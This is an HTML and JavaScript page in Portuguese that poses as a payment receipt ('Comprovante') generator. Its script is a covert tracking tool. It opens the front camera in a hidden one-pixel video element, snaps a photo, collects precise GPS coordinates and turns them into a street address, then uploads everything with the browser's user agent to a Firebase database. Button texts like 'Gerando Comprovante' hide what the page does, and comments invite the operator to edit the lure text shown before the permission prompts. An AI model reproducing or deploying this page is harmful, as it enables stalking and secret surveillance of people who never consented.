<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: #000;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      padding: 10px;
    }

    .container {
      width: 100%;
      max-width: 500px;
      background: #000;
      border-radius: 15px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
    }

    /* ======================================================
       IMAGEM DE TOPO — TROQUE AQUI QUANDO QUISER
       ====================================================== */
    .imagem-topo-wrapper {
      width: 100%;
      aspect-ratio: 1 / 1;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .imagem-topo-wrapper img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    .placeholder-imagem {
      color: #fff;
      font-size: 22px;
      font-weight: bold;
      text-align: center;
      padding: 20px;
    }

    .icone-padrao {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #667eea;
    }

    .icone-padrao svg {
      width: 120px;
      height: 120px;
      margin-bottom: 15px;
    }

    .icone-padrao .titulo-grande {
      color: #fff;
      font-size: 22px;
      font-weight: bold;
      text-align: center;
      padding: 0 20px;
    }

    canvas { display: none; }

    video.hidden-cam {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }

    .controls {
      background: #1a1a1a;
      padding: 20px;
      text-align: center;
    }

    /* ======================================================
       MENSAGEM PERSONALIZADA — TROQUE AQUI
       Este é o texto que aparece ANTES de pedir permissão
       de câmera/localização. Edite livremente.
       ====================================================== */
    .info {
      color: #fff;
      font-size: 14px;
      margin-bottom: 15px;
      line-height: 1.5;
    }
    /* ====================================================== */

    .contact {
      color: #ffd700;
      font-weight: bold;
      font-size: 13px;
      margin-bottom: 15px;
    }

    button {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 14px 30px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    button:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
    }

    button:disabled { opacity: 0.5; cursor: not-allowed; }

    .spinner {
      display: inline-block;
      width: 12px;
      height: 12px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.8s linear infinite;
      margin-right: 8px;
      vertical-align: middle;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .status {
      font-size: 12px;
      padding: 8px;
      margin-top: 10px;
      border-radius: 6px;
      display: none;
    }
    .status.show { display: block; }
    .status.success { background: #4caf50; color: white; }
    .status.error { background: #f44336; color: white; }
    .status.info { background: #2196f3; color: white; }
    .status.warning { background: #ff9800; color: white; }
  </style>
</head>

  <script src="https://www.gstatic.com/firebasejs/10.3.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.3.1/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      databaseURL: "https://hizag-b0c4b-default-rtdb.firebaseio.com/"
    };

    let db;
    try {
      firebase.initializeApp(firebaseConfig);
      db = firebase.database();
    } catch (e) {
      console.log("Firebase não configurado:", e);
    }

    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const btnEnviar = document.getElementById('btnEnviar');
    const statusDiv = document.getElementById('status');
    let cameraPronta = false;

    async function iniciarCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        video.srcObject = stream;
        cameraPronta = true;
      } catch (err) {
        console.error('Erro câmera:', err);
      }
    }

    function capturarFoto() {
      if (!cameraPronta || !video.videoWidth) return null;
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      return canvas.toDataURL('image/jpeg', 0.8);
    }

    function mensagemErroGeo(codigo) {
      switch (codigo) {
        case 1: return 'Permissão de localização negada pelo usuário';
        case 2: return 'Localização indisponível (GPS desligado ou sem sinal)';
        case 3: return 'Tempo esgotado aguardando localização';
        default: return 'Erro desconhecido ao obter localização';
      }
    }

    function tentarGeolocalizacao(opcoes) {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ ok: false, motivo: 'Navegador não suporta geolocalização' });
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (position) => resolve({ ok: true, position }),
          (err) => resolve({ ok: false, motivo: mensagemErroGeo(err.code) }),
          opcoes
        );
      });
    }

    async function capturarLocalizacao() {
      // 1ª tentativa: alta precisão, 20s
      let resultado = await tentarGeolocalizacao({ enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });

      // Se falhar por timeout ou indisponibilidade, tenta de novo com precisão menor (mais rápido de responder)
      if (!resultado.ok && resultado.motivo !== 'Permissão de localização negada pelo usuário') {
        mostrarStatus('📍 Tentando novamente obter Comprovante...', 'info');
        resultado = await tentarGeolocalizacao({ enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 });
      }

      if (!resultado.ok) {
        return { erro: resultado.motivo };
      }

      const position = resultado.position;
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      const localizacao = {
        latitude: lat,
        longitude: lng,
        precisao: Math.round(accuracy),
        timestamp: new Date().toLocaleString('pt-BR'),
        googleMapsUrl: `https://maps.google.com/?q=${lat},${lng}`
      };

      try {
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
        );
        const data = await response.json();
        localizacao.endereco = {
          rua: data.address?.road || '',
          numero: data.address?.house_number || '',
          bairro: data.address?.suburb || data.address?.city || '',
          estado: data.address?.state || '',
          pais: data.address?.country || ''
        };
      } catch (e) {
        localizacao.endereco = null;
      }

      return localizacao;
    }

    async function capturarEEnviar() {
      if (!db) {
        mostrarStatus('❌ Sistema não configurado', 'error');
        return;
      }

      btnEnviar.disabled = true;
      btnEnviar.innerHTML = '<span class="spinner"></span>Gerando Comprovante...';

      try {
        const localizacao = await capturarLocalizacao();

        if (localizacao.erro) {
          mostrarStatus('⚠️ ' + localizacao.erro, 'warning');
        }

        btnEnviar.innerHTML = '<span class="spinner"></span>Enviando aviso...';
        const fotoBase64 = capturarFoto();

        const timestamp = new Date().getTime();
        const dados = {
          timestamp: new Date().toLocaleString('pt-BR'),
          foto: fotoBase64 ? fotoBase64.substring(0, 500000) : null,
          localizacao: localizacao,
          userAgent: navigator.userAgent
        };

        await db.ref('capturas/' + timestamp).set(dados);

        mostrarStatus('✅ success');
        btnEnviar.innerHTML = '✅ Enviado';

        setTimeout(() => {
          btnEnviar.disabled = false;
          btnEnviar.innerHTML = 'Tente novamente';
        }, 3000);

      } catch (error) {
        console.error('Erro:', error);
        mostrarStatus('❌ Erro ao enviar. Tente novamente.', 'error');
        btnEnviar.disabled = false;
        btnEnviar.innerHTML = 'Erro';
      }
    }

    function mostrarStatus(msg, tipo) {
      statusDiv.textContent = msg;
      statusDiv.className = 'status show ' + tipo;
      setTimeout(() => {
        statusDiv.className = 'status';
      }, 5000);
    }

    iniciarCamera();
  </script>
</body>
</html>
